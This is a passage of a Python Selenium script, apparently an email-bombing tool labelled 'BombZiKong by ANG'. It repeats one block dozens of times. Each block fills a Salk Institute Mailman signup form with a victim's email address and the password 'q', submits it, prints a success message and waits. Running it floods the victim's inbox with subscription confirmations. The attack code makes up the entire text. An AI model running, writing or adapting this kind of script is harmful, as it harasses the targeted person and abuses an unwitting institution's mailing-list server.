browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
